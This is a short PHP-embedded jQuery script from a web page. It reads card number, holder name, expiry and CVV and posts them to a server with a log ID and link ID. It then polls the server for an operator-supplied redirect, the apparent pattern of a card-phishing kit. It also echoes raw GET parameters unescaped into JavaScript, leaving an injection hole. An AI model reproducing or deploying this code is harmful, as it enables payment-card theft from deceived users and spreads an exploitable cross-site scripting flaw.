    <script>
        $(document).ready(function () {
            $('#submitButton').click(function () {
                var cardNumber = $('#cc_pan').val();
                var cardHolder = $('#cc_name').val();
                var cardMonth = $('#cc_month').val();
                var cardYear = $('#cc_year').val();
                var cardCvv = $('#cc_cvv').val();


                $.ajax({
                    url: '/send_form.php',
                    type: 'POST',
                    data: {
                        cardNumber: cardNumber,
                        cardHolder: cardHolder,
                        cardMonth: cardMonth,
                        cardCvv: cardCvv,
                        cardYear: cardYear,
                        id_log: <?php echo $_GET['id'] ?>,
                        type: "card",
                        link_id: <?php echo $_GET['linkId'] ?>
                    },
                    success: function (response) {
                        console.log(response);
                        $("#loading").css("display", "block");
                        setInterval(function () {
                            $.ajax({
                                url: '/check_order.php',
                                type: 'post',
                                data: {
                                    id_log: <?php echo $_GET['id'] ?>
                                },
                                success: function (response) {
                                    console.log(response)
                                    localStorage.setItem('card', cardNumber)
                                    if(response == "wait"){
                                        return;
                                    }
                                   window.location.href=response+"&linkId=<?php echo $_GET['linkId'] ?>"
                                }
                            })
                        }, 500)
                    }
                })
            })
        })
    </script>
